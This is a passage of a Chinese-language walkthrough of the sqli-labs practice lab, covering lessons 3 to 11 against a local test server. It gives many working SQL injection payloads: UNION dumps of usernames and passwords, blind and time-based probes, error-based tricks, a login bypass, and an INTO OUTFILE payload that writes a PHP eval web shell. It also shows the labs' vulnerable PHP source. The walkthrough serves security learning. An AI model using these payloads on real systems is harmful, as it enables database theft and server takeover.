class="comment">#爆列数</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)<span class="attribute">order</span> by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#爆库名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#爆表名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆数据</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-4-GET-Error-based-Double-Quotes-String-基于错误的GET双引号字符型注入"><a href="#Less-4-GET-Error-based-Double-Quotes-String-基于错误的GET双引号字符型注入" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String (基于错误的GET双引号字符型注入)"></a>Less-4 GET - Error based - Double Quotes - String (基于错误的GET双引号字符型注入)</h3><h4 id="手动注入-3"><a href="#手动注入-3" class="headerlink" title="手动注入"></a>手动注入</h4><p>还是输入<code>?id=1&#39;</code>，发现能正常显示，故使用<code>?id=1&quot;</code>进行尝试</p><p><img src="https://s2.loli.net/2022/05/17/b7qLRYUfVed6hnW.png" alt="4.png"></p><p>根据报错猜测原语句是<code>(&quot;$id&quot;)</code>，故只需用<code>&quot;)</code>来闭合即可。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#尝试</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)--+</span><br><span class="line"><span class="comment">#爆列数</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)<span class="attribute">order</span> by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#爆库名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#爆表名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆数据</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String-双注入GET单引号字符型注入" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)"></a>Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)</h3><h4 id="源码分析-4"><a href="#源码分析-4" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与less-1一样用<code>&#39;&#39;</code>对输入进行处理来拼接，不同的是输入正确后不在显示数据库信息，而报错信息却能正确回显，此处将使用多种方式完成注入，以通过此关来学习各种注入方法及函数利用。</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><h5 id="利用left-和length-函数获取版本号及库名"><a href="#利用left-和length-函数获取版本号及库名" class="headerlink" title="利用left()和length()函数获取版本号及库名"></a>利用left()和length()函数获取版本号及库名</h5><p>逐位进行字符对比，如果正确则能看到<code>You are in...........</code>正确显示，否则不能。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆版本号，我的数据库版本是10.4.11-MariaDB</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> left(version(),<span class="number">1</span>)=<span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(version(),<span class="number">2</span>)=<span class="number">10</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(version(),<span class="number">15</span>)=<span class="string">&#x27;10.4.11-MariaDB&#x27;</span>--+</span><br><span class="line"><span class="comment">#爆库长</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and length(database())=<span class="number">8</span>--+</span><br><span class="line"><span class="comment">#爆库名，使用的数据库名称为security，先看第一位是不是大于a,然后逐位尝试</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(database(),<span class="number">1</span>)&gt;<span class="string">&#x27;a&#x27;</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(database(),<span class="number">8</span>)=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure><h5 id="利用substr-和ascii-函数获取表名"><a href="#利用substr-和ascii-函数获取表名" class="headerlink" title="利用substr()和ascii()函数获取表名"></a>利用substr()和ascii()函数获取表名</h5><p>逐位对比，如果正确则能看到<code>You are in...........</code>正确显示，否则不能。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆表名，这里第一个表是emails，使用的数据库是security</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">109</span>--+</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆出第一个字符后挨个爆破剩余字符，最后获取第一个表名，如果想获取第二个，只需要修改limit后的内容即可</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>--+</span><br></pre></td></tr></table></figure><h5 id="利用regexp-函数获取列名字"><a href="#利用regexp-函数获取列名字" class="headerlink" title="利用regexp()函数获取列名字"></a>利用regexp()函数获取列名字</h5><p>正则匹配，如果正确则能看到<code>You are in...........</code>正确显示，否则不能。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#看users中是否有以us开头的列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> <span class="number">1</span>=(<span class="literal">select</span> <span class="number">1</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span> and column_name regexp <span class="string">&#x27;^us[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)--+</span><br><span class="line"><span class="comment">#看users中是否有以pass开头的列名</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and <span class="number">1</span>=(<span class="literal">select</span> <span class="number">1</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span> and column_name regexp <span class="string">&#x27;^pass[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure><h5 id="利用ord-和mid-函数获取users-表的内容"><a href="#利用ord-和mid-函数获取users-表的内容" class="headerlink" title="利用ord()和mid()函数获取users 表的内容"></a>利用ord()和mid()函数获取users 表的内容</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一个用户名为Dumb，此语句是看第一个用户名的第一个字符是否为D</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>--+</span><br></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><blockquote><p><a href="https://www.cnblogs.com/JxSir/articles/15183838.html">MySQL ERROR 1267 (HY000)错误解决办法</a></p></blockquote><h5 id="利用floor-rand-0-2-进行报错注入"><a href="#利用floor-rand-0-2-进行报错注入" class="headerlink" title="利用floor(rand(0)*2)进行报错注入"></a>利用floor(rand(0)*2)进行报错注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,count(*),concat(0x3a,0x3a,(<span class="literal">select</span> user()),0x3a,0x3a,floor(rand(<span class="number">0</span>)*<span class="number">2</span>))a from information_schema.columns  group by a--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/jVI2pOsYowrS3e9.png" alt="5_1.png"></p><h5 id="利用-double-数值类型超出范围进行报错注入"><a href="#利用-double-数值类型超出范围进行报错注入" class="headerlink" title="利用 double 数值类型超出范围进行报错注入"></a>利用 double 数值类型超出范围进行报错注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">union</span> <span class="literal">select</span> (exp(~(<span class="literal">select</span> * FROM(SELECT USER())a))),<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h5 id="利用-bigint-溢出进行报错注入"><a href="#利用-bigint-溢出进行报错注入" class="headerlink" title="利用 bigint 溢出进行报错注入"></a>利用 bigint 溢出进行报错注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">union</span> <span class="literal">select</span> (!(<span class="literal">select</span> * from (<span class="literal">select</span> user())x) - ~<span class="number">0</span>),<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h5 id="利用xpath-函数报错注入"><a href="#利用xpath-函数报错注入" class="headerlink" title="利用xpath 函数报错注入"></a>利用xpath 函数报错注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/k4lyGzREivtZDOj.png" alt="5_2.png"></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> updatexml(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>) --+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/qBsh1nNgyuUOJk4.png" alt="5_3.png"></p><h5 id="利用数据的重复性"><a href="#利用数据的重复性" class="headerlink" title="利用数据的重复性"></a>利用数据的重复性</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> from (<span class="literal">select</span> NAME_CONST(version(),<span class="number">1</span>), NAME_CONST(version(),<span class="number">1</span>))x--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/OoRQ4mK8lukwNcq.png" alt="5_4.png"></p><h5 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;UNION SELECT (IF(SUBSTRING(current,<span class="number">1</span>,<span class="number">1</span>)=CHAR(<span class="number">115</span>),BENCHMARK(<span class="number">50000000</span>,ENCODE(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)),null)),<span class="number">2</span>,<span class="number">3</span> FROM (<span class="literal">select</span> database() as cur</span><br><span class="line">rent) as tb1--+</span><br></pre></td></tr></table></figure><h3 id="Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入"><a href="#Less-6-GET-Double-Injection-Double-Quotes-String-双注入GET双引号字符型注入" class="headerlink" title="Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)"></a>Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</h3><h4 id="手动注入-4"><a href="#手动注入-4" class="headerlink" title="手动注入"></a>手动注入</h4><p>利用报错注入可以看到版本信息。</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-6/?id=1&quot;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))--+--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-5"><a href="#源码分析-5" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>&quot;&quot;</code>来处理<code>$id</code>，不回显正常输出的信息。</p><h3 id="Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）"><a href="#Less-7-GET-Dump-into-outfile-String-（导出文件GET字符型注入）" class="headerlink" title="Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）"></a>Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）</h3><h4 id="源码分析-6"><a href="#源码分析-6" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以看出是使用了<code>((&#39;&#39;))</code>来处理输入。</p><h4 id="手动注入-5"><a href="#手动注入-5" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#测试是否存在注入</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;)) <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#将user,2,3写入文件uuu.txt中</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;))UNION SELECT user(),<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;txt文件路径&quot;</span>--+</span><br><span class="line"><span class="comment">#将一句话木马写入进去</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-7/?id=1&#x27;))UNION SELECT <span class="string">&#x27;&lt;?php <span class="variable">@eval</span>(<span class="variable">$_POST</span>[&quot;attack&quot;])?&gt;&#x27;</span>,<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">&quot;php文件路径&quot;</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注"><a href="#Less-8-GET-Blind-Boolian-Based-Single-Quotes-布尔型单引号GET盲注" class="headerlink" title="Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)"></a>Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)</h3><h4 id="手动注入-6"><a href="#手动注入-6" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#测试注入点</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-8/?id=1&#x27;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#布尔盲注</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-8/?id=1&#x27; and left(version(),<span class="number">15</span>)=<span class="string">&#x27;10.4.11-MariaDB&#x27;</span>--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-7"><a href="#源码分析-7" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//echo &#x27;You are in...........&#x27;;</span></span><br><span class="line"><span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关错误信息也不再回显，但可以通过是否出现<code>You are in...........</code>来实现布尔盲注。</p><h3 id="Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注"><a href="#Less-9-GET-Blind-Time-based-Single-Quotes-基于时间的GET单引号盲注" class="headerlink" title="Less-9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)"></a>Less-9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)</h3><h4 id="手动注入-7"><a href="#手动注入-7" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#时间盲注</span></span><br><span class="line"><span class="comment">#猜测数据库security</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-9/?id=1&#x27;<span class="attribute">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-9/?id=1&#x27;and If(ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-8"><a href="#源码分析-8" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line"><span class="comment">//print_r(mysqli_error($con1));</span></span><br><span class="line"><span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注"><a href="#Less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注" class="headerlink" title="Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)"></a>Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)</h3><p>输入被用<code>&quot;&quot;</code>处理，其他与less-9相同。</p><h3 id="Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入"><a href="#Less-11-POST-Error-Based-Single-quotes-String-基于错误的POST型单引号字符型注入" class="headerlink" title="Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)"></a>Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)</h3><h4 id="手动注入-8"><a href="#手动注入-8" class="headerlink" title="手动注入"></a>手动注入</h4><p>post接收参数</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#万能，密码随意</span></span><br><span class="line">admin&#x27;<span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#</span></span><br><span class="line"><span class="comment">#爆库名，密码随意</span></span><br><span class="line">1admin<span class="string">&#x27;union select 1,database()#</span></span><br></pre></td></tr></table></figure><h4 id="源码分析-9"><a href="#源码分析-9" class="headerlink" 